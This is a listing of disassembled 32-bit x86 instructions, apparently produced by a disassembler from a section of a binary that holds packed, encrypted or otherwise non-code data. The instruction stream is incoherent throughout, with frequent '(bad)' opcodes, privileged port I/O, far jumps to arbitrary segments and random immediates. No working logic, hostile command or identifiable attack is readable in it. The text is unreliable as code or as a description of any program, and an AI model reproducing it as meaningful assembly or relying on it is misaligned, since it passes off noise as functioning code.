  405833:	repz repz cmp eax,0x82215671
  40583a:	pop    ebp
  40583b:	add    DWORD PTR [ebx],esp
  40583d:	sahf   
  40583e:	out    0x7c,al
  405840:	mov    dl,0xd9
  405842:	sbb    eax,0xfc1b89eb
  405847:	arpl   WORD PTR [eax-0xa],dx
  40584a:	fnsave [ebp+edx*8+0xa]
  40584e:	xlat   BYTE PTR ds:[ebx]
  40584f:	inc    ebx
  405850:	mov    ss,WORD PTR [esi-0x1c525520]
  405856:	hlt    
  405857:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405858:	dec    esi
  405859:	scas   al,BYTE PTR es:[edi]
  40585a:	add    edi,eax
  40585c:	int3   
  40585d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40585e:	js     0x405800
  405860:	sbb    eax,0x4807fb1c
  405865:	icebp  
  405866:	out    dx,al
  405867:	call   0x9ef06d7c
  40586c:	ins    BYTE PTR es:[edi],dx
  40586d:	cmp    eax,0x368316ef
  405872:	aad    0x47
  405874:	sbb    DWORD PTR [esp+ecx*4],ecx
  405877:	out    dx,al
  405878:	adc    dh,BYTE PTR [ebp-0x334caf6a]
  40587e:	into   
  40587f:	sub    DWORD PTR [esp+ebx*8+0x84833ca],ecx
  405886:	mov    eax,0x5a7eaef3
  40588b:	xchg   ebp,eax
  40588c:	cwde   
  40588d:	loop   0x4058e5
  40588f:	lods   al,BYTE PTR ds:[esi]
  405890:	nop
  405891:	pushf  
  405892:	inc    ebx
  405894:	and    eax,0xbd9f821f
  40589a:	inc    edi
  40589b:	cmp    eax,DWORD PTR [esi+0x5adbe806]
  4058a1:	mov    ebx,0xfb3c5f3a
  4058a6:	cmp    eax,0xddf8ba3f
  4058ab:	cmp    BYTE PTR [edi+0x66],dh
  4058ae:	adc    DWORD PTR [edi],0x184f9214
  4058b4:	adc    eax,0x65d454bf
  4058b9:	mov    eax,0x67ff8d0
  4058be:	mov    es,edi
  4058c0:	or     dl,BYTE PTR [edi+0x65]
  4058c3:	cmp    bh,BYTE PTR [ebp+0x9]
  4058c6:	jge    0x405937
  4058c8:	out    dx,eax
  4058c9:	mov    ebp,0x490a9e70
  4058ce:	xor    al,0xf8
  4058d0:	stos   DWORD PTR es:[edi],eax
  4058d1:	xchg   edx,eax
  4058d2:	out    0x1,al
  4058d4:	test   DWORD PTR [edx-0x39877505],eax
  4058da:	jge    0x405913
  4058dc:	mov    dh,0xc7
  4058de:	iret   
  4058df:	mov    edi,0xc85301a7
  4058e4:	dec    ebx
  4058e5:	mov    edx,0x863a28a
  4058ea:	popf   
  4058eb:	adc    esi,edi
  4058ed:	icebp  
  4058ee:	mov    ds,WORD PTR [edi]
  4058f0:	mov    WORD PTR [edx-0x7a],gs
  4058f3:	jmp    0xdf86:0x8e9d4a43
  4058fa:	dec    ebp
  4058fb:	test   al,0xe5
  4058fd:	aas    
  4058fe:	fisubr DWORD PTR [esi]
  405900:	cmp    DWORD PTR [esi+0x18],ebp
  405903:	jae    0x405932
  405905:	xchg   edi,eax
  405906:	sbb    BYTE PTR [eax+esi*2+0x700acd5a],ch
  40590d:	pop    es
  40590e:	out    0x62,al
  405910:	retf   
  405911:	lahf   
  405912:	push   esi
  405913:	(bad)  
  405914:	xchg   esi,eax
  405915:	sub    BYTE PTR [eax+0x6f],cl
  405918:	test   BYTE PTR [esi+0x67fba9b0],0xee
  40591f:	mov    dl,BYTE PTR [ebp+0x74a04649]
  405925:	cmp    eax,0x3f69100c
  40592a:	dec    esi
  40592b:	retf   
  40592c:	fwait
  40592d:	dec    ax
  40592f:	or     DWORD PTR [ecx+esi*4],eax
  405932:	loop   0x4058b6
  405934:	xor    dl,BYTE PTR [edi]
  405936:	aas    
  405937:	xchg   esp,eax
  405938:	(bad)  
  40593a:	cmc    
  40593b:	xlat   BYTE PTR ds:[ebx]
  40593c:	in     al,dx
  40593d:	(bad)  
  40593e:	aad    0x75
  405940:	out    0xd4,eax
  405942:	outs   dx,BYTE PTR ds:[esi]
  405943:	adc    bh,BYTE PTR [ecx+edx*2]
  405946:	stos   DWORD PTR es:[edi],eax
  405947:	enter  0xd2c6,0x89
  40594b:	scas   al,BYTE PTR es:[edi]
  40594c:	jp     0x4058f2
  40594e:	jae    0x4059cd
  405950:	mov    al,0x6e
  405952:	jo     0x405976
  405954:	sub    edi,ebx
  405956:	cdq    
  405957:	lahf   
  405958:	mov    ebx,DWORD PTR [edx-0x1]
  40595b:	or     DWORD PTR [ebp-0x1d],ecx
  40595e:	retf   0xe8b3
  405961:	or     edi,DWORD PTR [ebx+0x43f89c78]
  405967:	loope  0x40597d
  405969:	leave  
  40596a:	jae    0x40591b
  40596c:	fcomp  QWORD PTR [edi-0x4378adea]
  405972:	jo     0x4059be
  405974:	outs   dx,BYTE PTR ds:[esi]
  405975:	mov    al,dh
  405977:	out    0xd1,al
  405979:	fld    QWORD PTR [ecx-0x1f171f30]
  40597f:	cmp    BYTE PTR [edi-0x6c],ah
  405982:	stc    
  405983:	mul    BYTE PTR [ebp-0x74]
  405986:	rol    DWORD PTR [eax-0x6b],cl
  405989:	adc    al,0xec
  40598b:	add    ah,ch
  40598d:	cmp    ecx,DWORD PTR [esi+0x4641bccc]
  405993:	adc    DWORD PTR [ecx],ebp
  405995:	out    dx,eax
  405996:	mov    esp,?
  405998:	and    eax,0xdfae1973
  40599d:	or     BYTE PTR [eax-0x715671ce],0xae
  4059a4:	mov    eax,0x2a01a9c8
  4059a9:	mov    dh,0xca
  4059ab:	iret   
  4059ac:	jbe    0x4059d8
  4059ae:	fidivr WORD PTR [edx+0x50]
  4059b1:	xor    DWORD PTR ds:0xdb9946c,esi
  4059b7:	shl    DWORD PTR [ebp-0x2d],0xcb
  4059bb:	fidiv  DWORD PTR [edi+eax*1-0x263b27cc]
  4059c2:	mov    WORD PTR [edi-0x3feb01ff],?
  4059c8:	inc    ecx
  4059c9:	dec    esi
  4059ca:	adc    esp,DWORD PTR ds:0x2a312432
  4059d0:	add    al,0xb2
  4059d2:	loopne 0x4059ef
  4059d4:	outs   dx,DWORD PTR ds:[esi]
  4059d5:	cdq    
  4059d6:	pop    esp
  4059d7:	or     BYTE PTR [edi],bl
  4059d9:	scas   al,BYTE PTR es:[edi]
  4059da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4059db:	sbb    al,0x75
  4059dd:	test   BYTE PTR [edx-0x4141869d],dl
  4059e3:	xchg   ebp,eax
  4059e4:	ds dec ebp
  4059e6:	push   es
  4059e7:	gs sub al,0x4f
  4059ea:	fldenv fs:[edx]
  4059ed:	dec    BYTE PTR [ebx+ebx*1+0x21e958c1]
  4059f4:	mov    ebp,0xd95da0c2
  4059f9:	or     BYTE PTR [ebx+0x8],0xa5
  4059fd:	jmp    0x405a1f
  4059ff:	shl    DWORD PTR [eax-0x1175b281],cl
  405a05:	rcl    BYTE PTR [edx+edi*8-0x267a8d45],1
  405a0c:	js     0x4059f4
  405a0e:	mov    esp,0x435db3f8
  405a13:	cmp    al,BYTE PTR [edi]
  405a15:	mov    edi,0x1ce04add
  405a1a:	and    BYTE PTR [ebx+0x4a],bl
  405a1d:	push   ebp
  405a1e:	sbb    al,0x71
  405a20:	push   edi
  405a21:	gs jne 0x405a92
  405a24:	mov    ebp,0xc20f5a3d
  405a29:	pop    edi
  405a2a:	push   esi
  405a2b:	gs push 0xffffff8b
  405a2e:	jge    0x405a99
  405a30:	pop    eax
  405a31:	leave  
  405a32:	push   es
  405a33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a34:	enter  0x2d0f,0x21
  405a38:	sub    al,0x90
  405a3a:	(bad)  
  405a3c:	fisttp WORD PTR [ebp+0x28]
  405a3f:	or     al,0xb2
  405a41:	sbb    DWORD PTR [ebp-0x6d350757],ecx
  405a47:	push   es
  405a48:	or     ebx,ecx
  405a4a:	ins    DWORD PTR es:[edi],dx
  405a4b:	mov    WORD PTR [edx+ebp*8-0x6d],?
  405a4f:	xor    ebp,DWORD PTR [ecx+ebx*1+0x4]
  405a53:	ins    BYTE PTR es:[edi],dx
  405a54:	scas   eax,DWORD PTR es:[edi]
  405a55:	sub    BYTE PTR [edi+0x7e69ba57],dh
  405a5b:	mov    DWORD PTR [ebp-0x607635e8],ebp
  405a61:	inc    esp
  405a62:	fst    DWORD PTR [edx-0x61]
  405a65:	sub    DWORD PTR [eax],esp
  405a67:	mov    ch,0xfb
  405a69:	(bad)  
  405a6a:	not    dl
  405a6c:	div    BYTE PTR [edi-0x406a708f]
  405a72:	pop    ss
  405a73:	pop    ecx
  405a74:	xchg   esp,eax
  405a75:	xor    DWORD PTR [ebx+esi*1],0x424cf6aa
  405a7c:	repz mov ch,0x14
  405a7f:	repnz (bad) 
  405a81:	mov    ah,0x23
  405a83:	scas   al,BYTE PTR es:[edi]
  405a84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a85:	frstor [edx-0x34]
  405a88:	lahf   
  405a89:	outs   dx,DWORD PTR cs:[esi]
  405a8b:	pop    ecx
  405a8c:	fadd   QWORD PTR [edx]
  405a8e:	outs   dx,BYTE PTR ds:[esi]
  405a8f:	sub    al,0x7f
  405a91:	and    eax,0xf58f8b7
  405a96:	icebp  
  405a97:	or     ecx,esi
  405a99:	jae    0x405a27
  405a9b:	vsubss xmm2,xmm1,DWORD PTR [edi+0x2c]
  405aa0:	xor    DWORD PTR [edi+0x59fab88f],ecx
  405aa6:	sbb    ah,BYTE PTR [ecx]
  405aa8:	retf   
  405aa9:	pop    esi
  405aaa:	dec    ebx
  405aab:	add    BYTE PTR [edx],0x79
  405aae:	fstp   DWORD PTR [ebp+0x6dd4a814]
  405ab4:	call   0x5308200c
  405ab9:	adc    edi,esi
  405abb:	std    
  405abc:	jle    0x405a6f
  405abe:	and    BYTE PTR [esi+0x6e6fd8bc],dh
  405ac4:	jbe    0x405af6
  405ac6:	aaa    
  405ac7:	push   eax
  405ac8:	dec    ebp
  405ac9:	mov    ebx,0xa4cef23
  405ace:	or     al,0x85
  405ad0:	dec    esp
  405ad1:	into   
  405ad2:	loop   0x405b31
  405ad4:	dec    edx
  405ad5:	(bad)  
  405ad6:	shl    DWORD PTR [ebp+0x63],1
  405ad9:	(bad)  
  405ada:	adc    al,0xd7
  405adc:	pushf  
  405add:	jmp    0xf8ab:0xa5c6b8ff
  405ae4:	bound  edi,QWORD PTR [ecx]
  405ae6:	inc    ebp
  405ae7:	push   cs
  405ae8:	mov    ah,0xf5
  405aea:	lds    ecx,FWORD PTR [esi]
  405aec:	mov    ebx,0x839198a5
  405af1:	ja     0x405b29
  405af3:	xor    al,BYTE PTR [ecx+edi*1+0x78d99a29]
  405afa:	in     eax,dx
  405afb:	adc    ebp,ecx
  405afd:	dec    ecx
  405afe:	sbb    al,bl
  405b00:	push   edx
  405b01:	aad    0x6
  405b03:	das    
  405b04:	mov    esp,ecx
  405b06:	add    DWORD PTR [ebx+0xc],edx
  405b09:	push   edx
  405b0a:	cmp    BYTE PTR [eax+0x12],al
  405b0d:	out    0xb1,eax
  405b0f:	mov    ds:0x3e1a5ae1,eax
  405b14:	mov    esi,0xb98217cb
  405b19:	xchg   ebp,esi
  405b1b:	jmp    0xc6f6:0xf57ae3a
  405b22:	pop    ss
  405b23:	cwde   
  405b24:	out    0xef,eax
  405b26:	lods   eax,DWORD PTR ds:[esi]
  405b27:	rol    esp,cl
  405b29:	sbb    ebx,esi
  405b2b:	mov    bh,0xbe
  405b2d:	sub    dl,dh
  405b2f:	dec    esp
  405b30:	xchg   esp,eax
  405b31:	and    DWORD PTR [edx+0x1],0x6cf0e34f
  405b38:	retw   0x6554
  405b3c:	xor    eax,0xc0f037d2
  405b41:	mov    dh,0xa1
  405b43:	sbb    al,0x8f
  405b45:	in     eax,dx
  405b46:	lods   eax,DWORD PTR ds:[esi]
  405b47:	xchg   edx,eax
  405b48:	pushf  
  405b49:	retf   
  405b4a:	mov    edi,0x1fbc17c
  405b4f:	scas   eax,DWORD PTR es:[edi]
  405b50:	and    DWORD PTR [ebx+0x8],esp
  405b53:	mov    al,0xb3
  405b55:	add    al,0x32
  405b57:	jg     0x405b26
  405b59:	adc    BYTE PTR [esi],ch
  405b5b:	ins    DWORD PTR es:[edi],dx
  405b5c:	test   BYTE PTR [edi+edi*2-0x4224e869],ah
  405b63:	push   ecx
  405b64:	jge    0x405b0a
  405b66:	mov    ebx,0x95e281f8
  405b6b:	add    DWORD PTR ds:0x28dd4c6b,esp
  405b71:	call   0xc8bd41a9
  405b76:	xor    BYTE PTR [esi-0x1d9e7f65],0x36
  405b7d:	xchg   esp,eax
  405b7e:	leave  
  405b7f:	add    dl,BYTE PTR [ebx]
  405b81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405b82:	jp     0x405baf
  405b84:	test   eax,0x34c380ab
  405b89:	ja     0x405b9a
  405b8b:	push   edx
  405b8c:	(bad)  
  405b8d:	clc    
  405b8e:	sbb    edx,esi
  405b90:	push   ebp
  405b92:	mov    ds:0xac0cd59,al
  405b97:	scas   al,BYTE PTR es:[edi]
  405b98:	shr    BYTE PTR [eax+0x5b],0x39
  405b9c:	(bad)  
  405b9d:	mov    edi,0x901cac9
  405ba2:	jae    0x405bce
  405ba4:	repz mov ds:0xc380bd64,al
  405baa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405bab:	add    BYTE PTR [esi-0x73],bh
  405bae:	leave  
  405baf:	mov    eax,0xb7a7f6bd
  405bb4:	xchg   ecx,eax
  405bb5:	test   eax,0x64b19d34
  405bba:	(bad)  
  405bbc:	std    
  405bbd:	out    dx,eax
  405bbe:	ficomp DWORD PTR [ecx]
  405bc0:	mov    esi,0x8cfeed46
  405bc5:	test   BYTE PTR [ebp-0x3d2b4f1c],bh
  405bcb:	mov    BYTE PTR [edi+0x1c886fb9],ch
  405bd1:	mov    al,ds:0x581f5e4f
  405bd6:	aam    0xf0
  405bd8:	test   al,0x5c
  405bda:	adc    al,0x1
  405bdc:	pop    ss
  405bdd:	js     0x405ba0
  405bdf:	push   ebp
  405be0:	or     eax,DWORD PTR [esi+0x1884050b]
  405be6:	xor    DWORD PTR [ebp-0x7c],esp
  405be9:	test   DWORD PTR [ebp+0x2289eaed],eax
  405bef:	ror    BYTE PTR [edi-0x43],cl
  405bf2:	sahf   
  405bf3:	xor    al,0xb8
  405bf5:	sahf   
  405bf6:	and    DWORD PTR [eax+0x50],esi
  405bf9:	xchg   BYTE PTR [eax+0x4e727a02],bl
  405bff:	sar    al,cl
  405c01:	inc    edi
  405c02:	ret    0x845c
  405c05:	jmp    0x405c54
  405c07:	mov    cl,0xc7
  405c09:	(bad)  
  405c0a:	lods   eax,DWORD PTR ds:[esi]
  405c0b:	dec    esp
  405c0c:	or     BYTE PTR [edx+0x78],0x47
  405c10:	push   0x9787042
  405c15:	enter  0x73a7,0x8d
  405c19:	(bad)  
  405c1b:	push   ecx
  405c1c:	xor    al,0xa2
  405c1e:	lods   al,BYTE PTR ds:[esi]
  405c1f:	out    dx,eax
  405c20:	scas   eax,DWORD PTR es:[edi]
  405c21:	ret    0x7512
  405c24:	retf   
  405c25:	sti    
  405c26:	lock in eax,0x54
  405c29:	(bad)  
  405c2a:	int3   
  405c2b:	ja     0x405be9
  405c2d:	mov    ch,0x1c
  405c2f:	sbb    cl,bh
  405c31:	prefetcht1 BYTE PTR [ebp-0x76]
  405c35:	or     BYTE PTR [edi],0x7a
  405c38:	xor    al,0x19
  405c3a:	outs   dx,DWORD PTR ds:[esi]
  405c3b:	mov    eax,0xaf274cca
  405c40:	inc    edi
  405c41:	lods   eax,DWORD PTR ds:[esi]
  405c42:	cld    
  405c43:	aas    
  405c44:	mov    BYTE PTR [edx],0x2a
  405c47:	pop    esp
  405c48:	scas   eax,DWORD PTR es:[edi]
  405c49:	js     0x405c44
  405c4b:	aam    0x8d
  405c4d:	jnp    0x405ca1
  405c4f:	jno    0x405c49
  405c51:	mov    eax,0xf35ffb47
  405c56:	gs push esi
  405c58:	fstp   TBYTE PTR [esi+0x40]
  405c5b:	push   esi
  405c5c:	jo     0x405c20
  405c5e:	or     eax,0x13a32e22
  405c63:	xorps  xmm1,XMMWORD PTR [edx-0x4b4b8e55]
  405c6a:	(bad)  
  405c6b:	sti    
  405c6c:	jae    0x405ce4
  405c6e:	sbb    ah,bl
  405c70:	push   cs
  405c71:	jne    0x405c10
  405c73:	add    BYTE PTR ds:0x53e06479,dh
  405c79:	into   
  405c7a:	add    eax,0xc631e927
  405c7f:	push   edi
  405c80:	or     DWORD PTR [eax-0xc546191],0xffffff86
  405c87:	xchg   esp,eax
  405c88:	push   ds
  405c89:	mov    edi,0x148f4793
  405c8e:	or     dl,dh
  405c90:	push   0x18
  405c92:	jp     0x405c4a
  405c94:	loopne 0x405c1b
  405c96:	pop    esi
  405c97:	in     al,dx
  405c98:	imul   eax,DWORD PTR [ebx],0xf9b06400
  405c9e:	and    al,0xdb
  405ca0:	or     ah,BYTE PTR [edi+0x2a]
  405ca3:	add    al,0x6a
  405ca6:	pop    edi
  405ca7:	inc    edx
  405ca8:	psubq  mm5,mm2
  405cab:	call   0xbd3e363c
  405cb0:	fwait
  405cb1:	mov    al,BYTE PTR [ebx]
  405cb3:	or     ecx,esi
  405cb5:	add    al,BYTE PTR [ecx+edx*1+0x4e972659]
  405cbc:	cli    
  405cbd:	xchg   edi,eax
  405cbe:	out    0xcf,eax
  405cc0:	xor    ecx,DWORD PTR [eax+edi*4-0x512ecbbd]
  405cc7:	fadd   QWORD PTR [ebp+0x41653853]
  405ccd:	fsubr  QWORD PTR [eax]
  405ccf:	and    esi,DWORD PTR cs:[eax]
  405cd2:	push   edx
  405cd3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405cd4:	in     eax,dx
  405cd5:	pushf  
  405cd6:	mov    DWORD PTR [eax],ecx
  405cd8:	adc    ah,BYTE PTR [edi+0x71]
  405cdb:	cdq    
  405cdc:	shr    BYTE PTR [esi],cl
  405cde:	pop    ds
  405cdf:	push   0xb4fba016
  405ce4:	sahf   
  405ce5:	xor    al,BYTE PTR [edi]
  405ce7:	push   esp
  405ce8:	xchg   ebx,eax
  405ce9:	or     al,cl
  405ceb:	pop    ss
  405cec:	cld    
  405ced:	add    BYTE PTR [eax+ebp*2-0x7e865126],bl
  405cf4:	add    al,0x1c
  405cf6:	repz pop ecx
  405cf8:	les    edx,FWORD PTR [ebx*4+0x3c12c897]
  405cff:	sub    esp,DWORD PTR [esi-0x3055e87d]
  405d05:	cs push cs
  405d07:	push   ebp
  405d08:	(bad)  
  405d09:	and    al,0xcb
  405d0b:	xlat   BYTE PTR ds:[ebx]
  405d0c:	in     al,0xdf
  405d0e:	pop    esi
  405d0f:	cmp    eax,0xb9a6fd6e
  405d14:	adc    al,0x96
  405d16:	pop    ss
  405d17:	leave  
  405d18:	adc    edx,ebx
  405d1a:	gs pop esi
  405d1c:	jl     0x405d88
  405d1e:	xor    BYTE PTR [eax+0x24],cl
  405d21:	cdq    
  405d22:	rcl    cl,cl
  405d24:	dec    esi
  405d25:	repnz or eax,0x8483292f
  405d2b:	or     dh,BYTE PTR [ebx]
  405d2d:	inc    esp
  405d2e:	enter  0x43d6,0x71
  405d32:	and    dh,0xa4
  405d35:	mov    al,ds:0x8c6175d0
  405d3a:	jb     0x405cfc
  405d3c:	jns    0x405d1b
  405d3e:	sub    bh,bh
  405d40:	xchg   BYTE PTR [eax],cl
  405d42:	mov    cl,BYTE PTR [eax+0x602b7eff]
  405d48:	aas    
  405d49:	sub    BYTE PTR [esi+0x30],cl
  405d4c:	popa   
  405d4d:	push   cs
  405d4e:	jmp    0x405cf3
  405d50:	scas   eax,DWORD PTR es:[edi]
  405d51:	fsubr  st(3),st
  405d53:	pop    edx
  405d54:	push   eax
  405d55:	sub    esi,eax
  405d57:	out    dx,eax
  405d58:	test   al,0xcc
  405d5a:	push   0x125fdb10
  405d5f:	enter  0xb233,0xa2
  405d63:	mov    DWORD PTR [ebp-0x24],ebp
  405d66:	jmp    0x31c1:0x968c1d16
  405d6d:	iret   
  405d6e:	push   esp
  405d6f:	(bad)  
  405d70:	pusha  
  405d71:	dec    ebp
  405d72:	daa    
  405d73:	dec    edx
  405d74:	push   ds
  405d75:	xlat   BYTE PTR ds:[ebx]
  405d76:	out    0x3,eax
  405d78:	ds or  al,0x59
  405d7b:	aam    0x67
  405d7d:	push   ecx
  405d7e:	iret   
  405d7f:	pop    esp
  405d80:	arpl   WORD PTR [edi],sp
  405d82:	imul   edi,DWORD PTR [esi],0xffffffee
  405d85:	pushf  
  405d86:	sbb    al,BYTE PTR [esi-0x1d4b7fb2]
  405d8c:	inc    edi
  405d8d:	sbb    eax,0x79c9c52b
  405d92:	out    dx,al
  405d93:	mov    dl,0xf
  405d95:	xor    eax,ebp
  405d97:	xchg   ecx,eax
  405d98:	int    0xff
  405d9a:	in     al,dx
  405d9b:	mov    edi,0x7a662078
  405da0:	outs   dx,DWORD PTR ds:[esi]
  405da1:	xlat   BYTE PTR ds:[ebx]
  405da2:	sub    eax,0xcb5c9dc7
  405da7:	lahf   
  405da8:	ins    DWORD PTR es:[edi],dx
  405da9:	js     0x405daf
  405dab:	jnp    0x405d6b
  405dad:	neg    DWORD PTR [ebx+ebx*2]
  405db0:	addr16 inc edi
  405db2:	jb     0x405daf
  405db4:	iret   
  405db5:	mov    ecx,0xadd6f6e6
  405dba:	cwde   
  405dbb:	outs   dx,DWORD PTR ds:[esi]
  405dbc:	arpl   di,sp
  405dbe:	outs   dx,DWORD PTR ds:[esi]
  405dbf:	xchg   ebp,eax
  405dc0:	inc    esp
  405dc1:	adc    bl,BYTE PTR ds:0xc5fc5c55
  405dc7:	jns    0x405df3
  405dc9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405dca:	sub    edx,ecx
  405dcc:	pop    ds
  405dcd:	lods   eax,DWORD PTR ds:[esi]
  405dce:	sub    BYTE PTR [edx-0x7d13c357],0x5d
  405dd5:	lods   al,BYTE PTR ds:[esi]
  405dd6:	mov    esp,0x25311719
  405ddb:	cld    
  405ddc:	adc    BYTE PTR [edi+0x4d1d7866],ch
  405de2:	popf   
  405de3:	xor    bh,BYTE PTR [ecx]
  405de5:	mov    DWORD PTR [ebp+0x0],edx
  405de8:	cmp    al,0x92
  405dea:	xchg   ecx,eax
  405deb:	fdiv   DWORD PTR [ecx]
  405ded:	xor    al,BYTE PTR [edx-0x1]
  405df0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405df1:	jbe    0x405e05
  405df3:	arpl   si,sp
  405df5:	in     eax,dx
  405df6:	cli    
  405df7:	lock mov edx,0x7bcc7c2
  405dfd:	jbe    0x405de5
  405dff:	mov    al,BYTE PTR [ebx-0x2028e28f]
  405e05:	or     bl,dl
  405e07:	sub    eax,0x850ebd6c
  405e0c:	hlt    
  405e0d:	je     0x405d90
  405e0f:	imul   esi,DWORD PTR [edx-0x25],0x8ab27acc
  405e16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405e17:	es dec ebp
  405e19:	add    DWORD PTR [esi+0x3e4d7167],ecx
  405e1f:	and    DWORD PTR [esp+edx*8+0x25],ebx
  405e23:	call   0x5d22704
  405e28:	push   ebx
  405e29:	mov    bh,0x47
  405e2b:	sbb    eax,0x71ed8b1c
  405e30:	stos   DWORD PTR es:[edi],eax
  405e31:	xor    DWORD PTR [eax+ebx*4],esp
  405e34:	repnz mov DWORD PTR [edx+0x632265dc],ebx
  405e3b:	adc    al,0xde
  405e3d:	sahf   
  405e3e:	mov    BYTE PTR [edx-0x5bedea2d],cl
  405e44:	mov    al,0xc
  405e46:	sub    BYTE PTR [ecx],ah
  405e48:	not    DWORD PTR [ebx-0x3ec55fb8]
  405e4e:	cdq    
  405e4f:	dec    eax
  405e50:	lahf   
  405e51:	paddusb mm5,QWORD PTR [ebx]
  405e54:	sbb    al,bl
  405e56:	lds    esi,FWORD PTR [eax+ebx*4-0x553563da]
  405e5d:	jo     0x405e6b
  405e5f:	add    DWORD PTR [edx-0x27],ecx
  405e62:	xor    ecx,DWORD PTR [esi+edi*1-0x71]
  405e66:	pop    edi
  405e67:	(bad)  
  405e68:	mov    ch,0x97
  405e6a:	sbb    eax,0x99a3bc9
  405e6f:	jb     0x405e19
  405e71:	retf   
  405e72:	in     eax,0xe3
  405e74:	xchg   edx,eax
  405e75:	imul   ebp,DWORD PTR [ebp-0x7b],0x75fcb6eb
  405e7c:	xchg   BYTE PTR [eax+ecx*1-0x7b69a07c],dh
  405e83:	adc    eax,0x171466
  405e88:	xor    BYTE PTR [edi-0x40],ah
  405e8b:	mov    gs,WORD PTR [eax]
  405e8d:	cmp    al,0xde
  405e8f:	in     eax,dx
  405e90:	jp     0x405e74
  405e92:	push   ecx
  405e93:	mov    esi,0x6a9bfedc
  405e98:	push   0x77
  405e9a:	(bad)  
  405e9b:	leave  
  405e9c:	mov    al,ds:0xaa4c5cd8
  405ea1:	ret    0xf88f
  405ea4:	aad    0x93
  405ea6:	mov    edx,0x4aa7062b
  405eab:	jo     0x405eb8
  405ead:	and    cl,BYTE PTR [ecx-0x67460dd3]
  405eb3:	push   0x6af6d540
  405eb8:	pushf  
  405eb9:	mov    al,ds:0xa62293d9
  405ebe:	mov    ch,0x46
  405ec0:	pop    ebp
  405ec1:	scas   eax,DWORD PTR es:[edi]
  405ec2:	sbb    eax,0x6477a6e7
  405ec7:	loopne 0x405e7e
  405ec9:	inc    ecx
  405eca:	dec    esp
  405ecb:	push   ebp
  405ecc:	in     eax,dx
  405ecd:	jae    0x405e8f
  405ecf:	pop    ecx
  405ed0:	call   0xd86f9456
  405ed5:	jmp    0x405edf
  405ed7:	add    DWORD PTR [ebp+0x71],0x4a9ebe24
  405ede:	pop    ss
  405edf:	dec    ebx
  405ee0:	scas   al,BYTE PTR es:[edi]
  405ee1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ee2:	shr    BYTE PTR [ebp-0x30],cl
  405ee5:	icebp  
  405ee6:	retf   0xf783
  405ee9:	and    eax,DWORD PTR ds:0xd45fb36f
  405eef:	in     eax,0xbe
  405ef1:	mov    esi,0x5e94b3ea
  405ef6:	retf   
  405ef7:	(bad)  
  405ef8:	in     al,dx
  405ef9:	mov    al,ds:0x747bf046
  405efe:	std    
  405eff:	mov    al,ds:0xc501455a
  405f04:	mov    cl,0x9
  405f06:	and    ebp,DWORD PTR [edx+0x52]
  405f09:	pop    edx
  405f0a:	pop    ebp
  405f0b:	sbb    BYTE PTR [edx+0x6c],dh
  405f0e:	xchg   ecx,eax
  405f0f:	les    edi,FWORD PTR [esi+0x23673c45]
  405f15:	mov    ecx,0x39630605
  405f1a:	inc    esp
  405f1b:	add    eax,0xc82c9b24
  405f20:	mov    bl,0x92
  405f22:	and    DWORD PTR [esi],edi
  405f24:	sub    DWORD PTR [ebx-0x44ce653a],0xa
  405f2b:	sub    ah,BYTE PTR gs:[edx]
  405f2e:	or     al,BYTE PTR [eax-0x6f]
  405f31:	pop    edi
  405f32:	mov    dl,BYTE PTR [ecx-0x7e]
  405f35:	mov    bl,0x68
  405f37:	xchg   ebx,eax
  405f38:	imul   esp,DWORD PTR [esi],0x692c3474
  405f3e:	sub    esi,eax
  405f40:	lar    ebx,WORD PTR [edx]
  405f43:	int3   
  405f44:	dec    ebx
  405f45:	jge    0x405ee5
  405f47:	pop    esi
  405f48:	dec    ecx
  405f49:	stos   BYTE PTR es:[edi],al
  405f4a:	rol    BYTE PTR [ebp-0x621eadd2],1
  405f50:	or     esi,DWORD PTR [eax]
  405f52:	push   edx
  405f53:	inc    esp
  405f54:	jae    0x405f85
  405f56:	loopne 0x405f56
  405f58:	les    esi,FWORD PTR [edi-0x2e221543]
  405f5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405f5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f60:	mul    DWORD PTR [ebp-0x20ae7ae1]
  405f66:	sbb    eax,0x36696f8b
  405f6b:	inc    eax
  405f6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f6d:	pop    ebp
  405f6e:	cmp    ecx,DWORD PTR [ecx]
  405f70:	sahf   
  405f71:	cmp    ebp,esi
  405f73:	sahf   
  405f74:	dec    esi
  405f75:	(bad)  
  405f76:	js     0x405fa8
  405f78:	lods   al,BYTE PTR ds:[esi]
  405f79:	jle    0x405f41
  405f7b:	out    dx,eax
  405f7c:	shl    eax,1
  405f7e:	jb     0x405f3d
  405f80:	pop    ebp
  405f81:	adc    DWORD PTR [esi+eax*2],ecx
  405f84:	or     esi,DWORD PTR [ebx]
  405f86:	xchg   ebp,eax
  405f87:	push   ebp
  405f88:	dec    ebp
  405f89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f8a:	out    dx,al
  405f8b:	adc    eax,0xdc3e2c3a
  405f90:	mov    ebp,DWORD PTR [edx]
  405f92:	cmp    edi,DWORD PTR [esp+edx*4]
  405f95:	ins    DWORD PTR es:[edi],dx
  405f96:	jmp    0x760f:0x8dac6480
  405f9d:	iret   
  405f9e:	add    BYTE PTR [esi-0x6841b7f2],bh
  405fa4:	xchg   esp,eax
  405fa5:	mov    bl,0x85
  405fa7:	rcl    DWORD PTR [edx+0x4d248ad7],cl
  405fad:	shr    DWORD PTR [esi+0x57ebc3e8],0x7c
  405fb4:	sub    ch,BYTE PTR [edx]
  405fb6:	sbb    al,0x22
  405fb8:	push   edi
  405fb9:	aam    0xa6
  405fbb:	stc    
  405fbc:	cvttps2pi mm1,QWORD PTR [eax-0x2a]
  405fc0:	push   es
  405fc1:	mov    esp,0xba64d528
  405fc6:	lahf   
